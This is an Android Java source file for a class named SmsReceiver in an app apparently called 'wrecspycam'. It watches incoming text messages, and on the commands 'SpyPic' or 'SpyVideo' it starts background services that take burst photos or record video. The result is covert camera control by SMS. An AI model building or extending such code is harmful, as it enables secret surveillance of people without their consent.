package com.byteshaft.wrecspycam;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    String msg_from;
    String msgBody;
    int firstValue;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs;
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        msgBody = msgs[i].getMessageBody();
                        String intValue = msgBody.replaceAll("[^0-9]", "");
                        Log.i("SPY_CAM" , "INT :" + intValue);
                        System.out.println(intValue);
                        String getMsg = msgBody.replaceAll("[0-9]","");
                        Log.i("SPY_CAM" , "Msg :" + getMsg);
                        if (getMsg.equals("SpyPic")) {
                            Log.i("SPY_CAM", "Capturing Image");
                            Intent picServiceIntent = new Intent(context, SpyPictureService.class);
                            if (!intValue.isEmpty()) {
                                firstValue = Character.getNumericValue(intValue.charAt(0));
                            }
                            if (firstValue != 0 && firstValue < 5) {
                                System.out.println("FirstValue :" + firstValue);
                                picServiceIntent.putExtra("burstValue", firstValue);
                            }
                            context.startService(picServiceIntent);
                        } else if (getMsg.equals("SpyVideo")) {
                            Log.i("SPY_CAM", "Capturing Video");
                            Intent videoIntent = new Intent(context, SpyVideoService.class);
                            if (!intValue.isEmpty()) {
                                int videoDelay = Integer.parseInt(intValue);
                                Log.i("SPY_CAM" , "videoDuration" + videoDelay);
                                videoIntent.putExtra("videoDelay" , videoDelay);
                            }
                            context.startService(videoIntent);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
